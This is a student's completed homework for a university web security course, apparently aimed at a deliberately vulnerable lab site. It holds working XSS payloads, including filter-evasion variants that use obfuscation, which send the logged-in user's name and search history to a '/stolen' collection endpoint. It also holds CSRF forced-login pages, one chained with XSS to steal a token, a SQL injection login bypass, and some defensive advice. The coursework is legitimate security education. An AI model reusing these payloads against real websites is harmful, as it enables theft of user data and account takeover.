COSC 480B Assignment #3: Web Security

Due Date: 11/9/20 at 5:00pm ET

You may work with a partner on this assignment.
Only one person partnership needs to submit.

Reminder: You may NOT work with the same partner on multiple assignments.


NAMES: [Full Names of both partners]

________________________________________________________________________________________

Part 1: Cross-site Scripting (XSS)

	1.0) Payload (JavaScript/jQuery):
	<script>document.addEventListener("DOMContentLoaded", function(){var url = "http://localhost:31337/stolen?user=" + document.getElementById("logged-in-user").innerText + "&last_search=" + document.getElementsByClassName("history-item list-group-item")[1].innerText; window.location.href=url},false);</script>
	
	1.0) No defense

		http://0.0.0.0:8080/search?xssdefense=0&q=<script>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</script>

		or

		localhost:8080/search?xssdefense=0&q=<script>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</script>

	1.1) Remove "script"

		http://0.0.0.0:8080/search?xssdefense=1&q=%3Cimg%20src%3D%22x.gif%22%20onerror%3Dwindow.location.href%3Durl%3D%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%2Bdocument.getElementById%28%22logged-in-user%22%29.innerText%2B%22%26last_search%3D%22%2Bdocument.getElementsByClassName%28%22list-group-item%22%29%5B1%5D.innerText%3E

		or

		localhost:8080/search?xssdefense=1&q=%3Cimg%20src%3D%22x.gif%22%20onerror%3Dwindow.location.href%3Durl%3D%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%2Bdocument.getElementById%28%22logged-in-user%22%29.innerText%2B%22%26last_search%3D%22%2Bdocument.getElementsByClassName%28%22list-group-item%22%29%5B1%5D.innerText%3E

	1.2) Remove several tags

		http://0.0.0.0:8080/search?xssdefense=2&q=<scrscriptipt>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</scrscriptipt>

		or

		localhost:8080/search?xssdefense=2&q=<scrscriptipt>document.addEventListener%28%22DOMContentLoaded%22%2C%20function%28%29%7Bvar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22%20%2B%20document.getElementById%28%22logged-in-user%22%29.innerText%20%2B%20%22%26last_search%3D%22%20%2B%20document.getElementsByClassName%28%22history-item%20list-group-item%22%29%5B1%5D.innerText%3B%20window.location.href%3Durl%7D%2Cfalse%29%3B</scrscriptipt>


	1.3) Remove " ' and ;

		http://0.0.0.0:8080/search?xssdefense=3&q=%3Cimg%20src%3D1%20onerror%3Dwindow.location.href%3DString.fromCharCode%28104%2C116%2C116%2C112%2C58%2C47%2C47%2C108%2C111%2C99%2C97%2C108%2C104%2C111%2C115%2C116%2C58%2C51%2C49%2C51%2C51%2C55%2C47%2C115%2C116%2C111%2C108%2C101%2C110%2C63%2C117%2C115%2C101%2C114%2C61%29%2Bdocument.getElementById%28String.fromCharCode%28108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114%29%29.innerText%2BString.fromCharCode%2838%2C108%2C97%2C115%2C116%2C95%2C115%2C101%2C97%2C114%2C99%2C104%2C61%29%2Bdocument.getElementsByClassName%28String.fromCharCode%28104%2C105%2C115%2C116%2C111%2C114%2C121%2C45%2C105%2C116%2C101%2C109%2C32%2C108%2C105%2C115%2C116%2C45%2C103%2C114%2C111%2C117%2C112%2C45%2C105%2C116%2C101%2C109%29%29%5B1%5D.innerText%3E%3C%2Fimg%3E

		or

		localhost:8080/search?xssdefense=3&q=%3Cimg%20src%3D1%20onerror%3Dwindow.location.href%3DString.fromCharCode%28104%2C116%2C116%2C112%2C58%2C47%2C47%2C108%2C111%2C99%2C97%2C108%2C104%2C111%2C115%2C116%2C58%2C51%2C49%2C51%2C51%2C55%2C47%2C115%2C116%2C111%2C108%2C101%2C110%2C63%2C117%2C115%2C101%2C114%2C61%29%2Bdocument.getElementById%28String.fromCharCode%28108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114%29%29.innerText%2BString.fromCharCode%2838%2C108%2C97%2C115%2C116%2C95%2C115%2C101%2C97%2C114%2C99%2C104%2C61%29%2Bdocument.getElementsByClassName%28String.fromCharCode%28104%2C105%2C115%2C116%2C111%2C114%2C121%2C45%2C105%2C116%2C101%2C109%2C32%2C108%2C105%2C115%2C116%2C45%2C103%2C114%2C111%2C117%2C112%2C45%2C105%2C116%2C101%2C109%29%29%5B1%5D.innerText%3E%3C%2Fimg%3E

	1.4) [Optional extra credit] Encode < and >

		http://0.0.0.0:8080/search?xssdefense=4&q=TODO


________________________________________________________________________________________

Part 2: Cross-site Request Forgery (CSRF)

	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4

		<html>
            <head>
                <title>Safe site</title>
            </head>
		   <body>
                <form action="http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4" method="POST">
                    <input id="username" name="username" type="text" value="attacker" required >
                    <input id="userpass" name="password" type="password" value="URpwn3d" required >
                </form>
                <script>
                    document.forms[0].submit();
                </script>
           </body>
        </html>


	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
        <html>
            <head>
                <title>Safe site</title>
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
            </head>
            <script type="text/javascript">
                document.addEventListener("DOMContentLoaded", function(){var url = "http://0.0.0.0:8080/search?q=%3Cscript%3E+document.addEventListener%28%22DOMContentLoaded%22%2C+function+%28%29%7B+var+token+%3D+Cookies.get%28%22csrf_token%22%29%3B++%24.post%28%22http%3A%2F%2F0.0.0.0%3A8080%2Flogin%3Fcsrfdefense%3D0%26xssdefense%3D4%22%2C+%7Busername%3A+%22attacker%22%2C+password%3A+%22URpwn3d%22%2C+csrf_token%3A+token%7D%29%3B%7D%29%3B+%3C%2Fscript%3E+";
        window.location.href=url; },false);
            </script>
        </html>

	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4

		<html>
			TODO
		</html>


________________________________________________________________________________________


Part 3: SQL Injection

	Username: victim
	Password: 'or 0=0--


________________________________________________________________________________________


Part 4: Better Defenses


	4.1) Briefly describe how you implemented password salting and hashing

		TODO


	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks

		To prevent the SQL injection attack proposed, a solution is to use a parameterized query
		by replacing the variables(username and password) with question marks, notifying that the
		variables are parameters. And as described in "Database Tips", "the database API can then 
		be used to set the parameters before executing the query."
		
		Change the following line in validateUser(username, password) for database.py:
		"cur.execute("SELECT * FROM users WHERE username='{}' AND password='{}'".format(username, password))"
		into the following:
		"cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))"


	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
	     strengthen Bungle!'s defenses to prevent XSS attacks

		It is important to realize that a large portion of XSS attacks occur because
		the user-entered data are not properly sanitized hence get excuted as scripts
		or different types of excutables. As a result, an important step for Bunglers
		to take in preventing XSS attacks is to implement proper user-entered data
		sanitizing procedures, including filtering out html tags, key words,and urls.
		Another essential method that should also be implemented is to escape special
		characters such as <, >, ", and ', preventing the user-entered data from
		behaving like executable codes. At the same time, the Bunglers can also apply
		constraints on the length of search inputs that user can provide and this can
		assist in preventing certain XSS attacks that require long scripts. Lastly,
		it is crucial to ensure that all outputs that will be returned to the users
		are encoded before returned. However, it is worth noting that although these
		mentioned methods can help prevent a large portion of the XSS attacks, it is
		still possible to bypass these preventions. For example, although filtering
		out sensitive content is useful, the filtering procedure may not be inclusive
		of all possible tags or key words that can be used for XSS attacks which can
		lead to potential vulnerability. As a result, it is essential to have consistent
		efforts in preventing XSS attacks proactively.



	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should
	     strengthen Bungle!'s defenses to prevent CSRF attacks

	     	TODO


________________________________________________________________________________________


Additional Questions

	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)

		We divided up the work so that we each worked on different attacks while reviewing
		each other's work and offering suggestions.


	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?
		https://owasp.org/www-community/xss-filter-evasion-cheatsheet



	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?

		The assignment overall is very clearly instructed and organized!
